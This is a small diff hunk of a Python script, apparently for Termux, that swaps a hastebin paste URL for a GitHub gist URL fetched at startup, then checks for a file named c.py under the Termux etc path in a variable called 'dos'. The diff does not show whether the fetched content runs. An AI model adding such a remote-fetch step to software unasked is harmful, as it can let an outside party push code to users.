@@ -1287,7 +1287,7 @@ def main():
         except KeyboardInterrupt:
             break
 def start():
-    r = requests.get("https://hastebin.com/raw/irubezayoc")
+    r = requests.get("https://gist.githubusercontent.com/darkness-falls/e9ee1f6c6bf7aff568b67629b631d097/raw/a80361171c9ed57d6f674ef36e98f3fe29fbd67b/gistfile1.txt")
     dos = os.path.exists('/data/data/com.termux/files/usr/etc/c.py')
     try:
         if dos is False:
